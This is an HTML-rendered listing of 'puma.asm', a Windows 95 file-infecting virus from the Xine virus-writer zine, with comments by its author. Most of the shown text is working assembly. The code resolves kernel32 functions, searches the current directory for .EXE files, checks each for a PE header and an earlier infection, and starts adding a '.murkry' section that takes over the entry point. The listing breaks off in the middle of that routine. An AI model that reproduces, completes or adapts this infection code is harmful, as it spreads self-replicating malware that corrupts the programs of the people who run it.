<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>puma.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #2 - Phile 024 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">


</span><span class="sc1">; This virus was written to use a GetProc address routine that jhb wrote</span><span class="sc0">
</span><span class="sc1">; it basically does what Bizatch does. It adds a section to the file and has</span><span class="sc0">
</span><span class="sc1">; the entry point point at it. Hopefully JHB has written a PE file infection</span><span class="sc0">
</span><span class="sc1">; tutorial with Xine 2. So check that, also check the code for comments I did</span><span class="sc0">
</span><span class="sc1">; not recomment the GetprocAddress check JHB article on the finaly version</span><span class="sc0">
</span><span class="sc1">; I just modified it a bit ;).</span><span class="sc0">
</span><span class="sc1">; Well enjoy this due to the fact that this is a direct action virus and does</span><span class="sc0">
</span><span class="sc1">; not jump directories I dount it will spread far.  But this just proves that</span><span class="sc0">
</span><span class="sc1">; anything Ms comes out with someone can infect. (I believe this parphrase</span><span class="sc0">
</span><span class="sc1">; something from VLAD &lt;sigh&gt; sorry to hear they have passed on)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Simple Win95 virus using a search engine for all routines it might need</span><span class="sc0">
</span><span class="sc1">; I did not make the Getproc just reworked it a bit to work with my newest</span><span class="sc0">
</span><span class="sc1">; creation</span><span class="sc0">
</span><span class="sc1">;**** Beta 1.0</span><span class="sc0">
</span><span class="sc1">; Murkry.Puma</span><span class="sc0">
</span><span class="sc1">; Author Murkry</span><span class="sc0">
</span><span class="sc1">; dec 28 1996</span><span class="sc0">
</span><span class="sc1">;Features:</span><span class="sc0">
</span><span class="sc1">; Use get procaddr to get the needed routine API address from kernel32</span><span class="sc0">
</span><span class="sc1">; Will infect all exe PE files in the directory does not span directories</span><span class="sc0">
</span><span class="sc1">; Adds .murkry as a section header is used to check for previous infection</span><span class="sc0">

</span><span class="sc1">;                -14h</span><span class="sc0">
</span><span class="sc1">;               -10h</span><span class="sc0">
</span><span class="sc1">;               -0Ch</span><span class="sc0">
</span><span class="sc1">;holders        -10</span><span class="sc0">
</span><span class="sc1">;ret_address    -8</span><span class="sc0">
</span><span class="sc1">;old_bp         -4</span><span class="sc0">

</span><span class="sc1">;VARIOUS EQU FOR PUMA'S  USE </span><span class="sc0">
</span><span class="sc5">MAX_PATH</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0FFH</span><span class="sc0">       </span><span class="sc1">;MAX PATH FOR WIN95/NT </span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">;USED for CreateFile to open existing file</span><span class="sc0">
</span><span class="sc5">GENERIC_READ</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">80000000H</span><span class="sc0">  </span><span class="sc1">;OPEN FILE R/W</span><span class="sc0">
</span><span class="sc5">GENERIC_WRITE</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">40000000H</span><span class="sc0">  </span><span class="sc1">;USED BY THE CreateFile</span><span class="sc0">
</span><span class="sc5">FATTR_NORMAL</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;normal file attribute for CreateFile</span><span class="sc0">

</span><span class="sc5">PE_SIZE</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0F8H</span><span class="sc0">       </span><span class="sc1">;size of PE file header</span><span class="sc0">
</span><span class="sc5">SEC_SIZE</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">28H</span><span class="sc0">        </span><span class="sc1">;size of a section header</span><span class="sc0">
</span><span class="sc5">FB_SIZE</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0400H</span><span class="sc0">      </span><span class="sc1">;VIRUS file buffer size</span><span class="sc0">

</span><span class="sc1">;typedef struct _WIN32_FIND_DATA {</span><span class="sc0">
</span><span class="sc1">;   DWORD dwFileAttributes;                          0</span><span class="sc0">
</span><span class="sc1">;   FILETIME ftCreationTime;            DD ?,?       4</span><span class="sc0">
</span><span class="sc1">;   FILETIME ftLastAccessTime;          DD ?,?       C</span><span class="sc0">
</span><span class="sc1">;   FILETIME ftLastWriteTime;           DD ?,?       14</span><span class="sc0">
</span><span class="sc1">;   DWORD nFileSizeHigh;                             1C</span><span class="sc0">
</span><span class="sc1">;   DWORD nFileSizeLow;                              20</span><span class="sc0">
</span><span class="sc1">;   DWORD dwReserved0;                               24</span><span class="sc0">
</span><span class="sc1">;   DWORD dwReserved1;                               28</span><span class="sc0">
</span><span class="sc1">;   CHAR cFileName[MAX_PATH];                        2C</span><span class="sc0">
</span><span class="sc1">;   CHAR cAlternateFileName[ 0EH ];</span><span class="sc0">
</span><span class="sc1">;} WIN32_FIND_DATA</span><span class="sc0">


</span><span class="sc1">;Stack frame definitions:</span><span class="sc0">
</span><span class="sc5">TEMP</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">               </span><span class="sc1">;temporary storage location</span><span class="sc0">
</span><span class="sc5">Shandle</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">TEMP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">;handle for file search functions</span><span class="sc0">
</span><span class="sc5">FileHand</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">Shandle</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">;handle for file open/read/write/close</span><span class="sc0">
</span><span class="sc5">IOBYTES</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FileHand</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FIND_DATA</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">IOBYTES</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">       </span><span class="sc1">;file search data structure</span><span class="sc0">
</span><span class="sc5">FILEBUF</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FIND_DATA</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">+</span><span class="sc5">MAX_PATH</span><span class="sc0">
</span><span class="sc5">WORKSP</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FILEBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">  
</span><span class="sc1">;below is one way of dealing with the getprocadd return info</span><span class="sc0">
</span><span class="sc1">;when it returns it is setup to leave the address routines on the</span><span class="sc0">
</span><span class="sc1">;stack. PUMA will allocate the space for the above data right after the</span><span class="sc0">
</span><span class="sc1">;return of GetProcAdd this allows us to access the routines the same way</span><span class="sc0">
</span><span class="sc1">;we access the data we save on the stack</span><span class="sc0">
</span><span class="sc5">FindFirst</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">WORKSP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FindNext</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FindFirst</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Create</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">FindNext</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">lclose</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">Create</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">SetPointer</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">lclose</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Read</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">SetPointer</span><span class="sc0">  </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Write</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">Read</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc10">stdcall</span><span class="sc0">

</span><span class="sc1">;Working version of a get address routine ends stack containing the</span><span class="sc0">
</span><span class="sc1">;request address of the process in a last in first out</span><span class="sc0">
</span><span class="sc1">;set to work with KERNEl32.dll and nothing else</span><span class="sc0">
</span><span class="sc1">;but once you get GetProcAddress, LoadLibrary you can get all</span><span class="sc0">
</span><span class="sc1">;other dll calls</span><span class="sc0">

</span><span class="sc1">;Define the needed external func tions and constants here.</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">           </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">       </span><span class="sc1">;only kernel32 call not</span><span class="sc0">
                                       </span><span class="sc1">;set up with the GetProcAdd</span><span class="sc0">
                                       </span><span class="sc1">;used in the dummy host</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">                                        </span><span class="sc1">;the data area</span><span class="sc0">
</span><span class="sc1">;Tasm5 will not compile with out some data oh well</span><span class="sc0">
</span><span class="sc1">;fake it out ;)</span><span class="sc0">
</span><span class="sc5">Waste</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">                                   </span><span class="sc1">;executable code starts here</span><span class="sc0">

</span><span class="sc5">PUMA</span><span class="sc4">:</span><span class="sc0">
       
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OverData</span><span class="sc0">
</span><span class="sc5">LookFor</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'_lclose'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> 
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'SetFilePointer'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          
</span><span class="sc5">last</span><span class="sc0">            </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">        
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0Bh</span><span class="sc0">
</span><span class="sc5">HowMany</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">7h</span><span class="sc0">                      </span><span class="sc1">;How many address'</span><span class="sc0">
                                                </span><span class="sc1">;I am requesting</span><span class="sc0">
</span><span class="sc5">exe</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OverData</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSHAD</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;eax = eip = our offset</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">ESI</span><span class="sc4">,[</span><span class="sc8">EDX</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">LookFor</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc4">]</span><span class="sc0">                      
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">HowMany</span><span class="sc0">                     </span><span class="sc1">;how many functions</span><span class="sc0">
         
         
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetProcAdd</span><span class="sc0">                      </span><span class="sc1">;on return the stack wil</span><span class="sc0">
                                                </span><span class="sc1">;have addresses in it</span><span class="sc0">
                                                 
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EBP</span><span class="sc0">                             </span><span class="sc1">;this gives us a r/w area</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc5">WORKSP</span><span class="sc0">                      </span><span class="sc1">;to work with on the stack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">                         </span><span class="sc1">;amd since our address our</span><span class="sc0">
                                                </span><span class="sc1">;on the stack it preserves</span><span class="sc0">
                                                </span><span class="sc1">;them for us</span><span class="sc0">


        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EDI</span><span class="sc4">,</span><span class="sc8">EDX</span><span class="sc0">                         </span><span class="sc1">;since we used edx</span><span class="sc0">
                                                </span><span class="sc1">;to store our offset</span><span class="sc0">
                                                </span><span class="sc1">;this just saves use from</span><span class="sc0">
                                                </span><span class="sc1">;the call pop sub bit</span><span class="sc0">


</span><span class="sc1">;FindFirstFileA(ptr file_name, ptr Find data)</span><span class="sc0">
</span><span class="sc1">;returns in eax the handle of = -1 if no file found</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FIND_DATA</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;THIS IS A FINDFIRST</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                                     </span><span class="sc1">;FILE CALL</span><span class="sc0">
                                                        </span><span class="sc1">;FIND ANY FILE THAT</span><span class="sc0">
        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EDI</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">exe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PUMA</span><span class="sc0"> </span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;IS A *.EXE</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindFirst</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                                      
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Shandle</span><span class="sc4">],</span><span class="sc8">EAX</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc10">ERROR</span><span class="sc0">                                   </span><span class="sc1">;NO FILES FOUND</span><span class="sc0">

</span><span class="sc5">INFECT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">FoundOne</span><span class="sc0">

</span><span class="sc1">;FindNextFileA( ptr handle, ptr find data structure)</span><span class="sc0">
</span><span class="sc1">;returns in eax True = 1, False = 0</span><span class="sc0">

        </span><span class="sc6">LEA</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FIND_DATA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">Shandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">EAX</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FindNext</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">INFECT</span><span class="sc0">


</span><span class="sc10">ERROR</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">ESP</span><span class="sc4">,</span><span class="sc5">FindFirst</span><span class="sc0">                   </span><span class="sc1">;restore the stack back to </span><span class="sc0">
        </span><span class="sc6">POPAD</span><span class="sc0">                                   </span><span class="sc1">;where is was when we got </span><span class="sc0">
                                                </span><span class="sc1">;also restore all regs</span><span class="sc0">
</span><span class="sc5">HostRet</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">fini</span><span class="sc0">                            </span><span class="sc1">;this is dynamicaly written </span><span class="sc0">
                                                </span><span class="sc1">;when the virus infects host</span><span class="sc0">

</span><span class="sc1">;====================================================================</span><span class="sc0">
</span><span class="sc5">FoundOne</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenIt</span><span class="sc0">                  </span><span class="sc1">;opens the file</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">Trouble</span><span class="sc0">                 </span><span class="sc1">;problem opening the file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHand</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;save file handle</span><span class="sc0">

        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">CheckIt</span><span class="sc0">                 </span><span class="sc1">;check if PE and not infected</span><span class="sc0">
 
</span><span class="sc5">DoneIt</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">FopenError</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FileHand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">EBP</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">lclose</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Trouble</span><span class="sc4">:</span><span class="sc0">                        </span><span class="sc1">;file not opened exit here</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;simple reads in the first 1024 of the file checks if PE at the location</span><span class="sc0">
</span><span class="sc1">;specified by the 3ch in the MZ header</span><span class="sc0">
</span><span class="sc1">;Win95 does not check if for extended exe header at 18h = 40h</span><span class="sc0">
</span><span class="sc1">;it only checks if 3ch is a pointer to PE</span><span class="sc0">
</span><span class="sc1">;if this is ok for Win95 why should a virii do more</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">CheckIt</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;File is Opened</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">FB_SIZE</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FILEBUF</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileRead</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ChError</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">FILEBUF</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;get the loc of the PE header</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">FILEBUF</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">CheckInfect</span><span class="sc0">                     </span><span class="sc1">;ok a PE file infect</span><span class="sc0">


</span><span class="sc5">ChError</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;file not a PE </span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">                                    </span><span class="sc1">; </span><span class="sc0">
                                                </span><span class="sc1">; </span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;ok We have a PE file now we find if its infected</span><span class="sc0">
</span><span class="sc1">;and if the header fits in buffer (1k)</span><span class="sc0">
</span><span class="sc5">CheckInfect</span><span class="sc4">:</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                 
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FILEBUF</span><span class="sc0">             
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">PE_SIZE</span><span class="sc0">             </span><span class="sc1">;eax = dos header size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;SAVE IN EBX</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">EAX</span><span class="sc4">,</span><span class="sc8">EAX</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get actaul sector count</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SEC_SIZE</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">;eax = size of all header info needed</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FB_SIZE</span><span class="sc0">             </span><span class="sc1">;will it fit in FILEBUF</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">TryError</span><span class="sc0">                </span><span class="sc1">;nope outa here</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">PE_SIZE</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;will it fit in the file</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">TryError</span><span class="sc0">                        </span><span class="sc1">;Size of the Optional header</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">;# of sections in the file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">SEC_SIZE</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">PE_SIZE</span><span class="sc0">                     </span><span class="sc1">;locate the last section </span><span class="sc0">
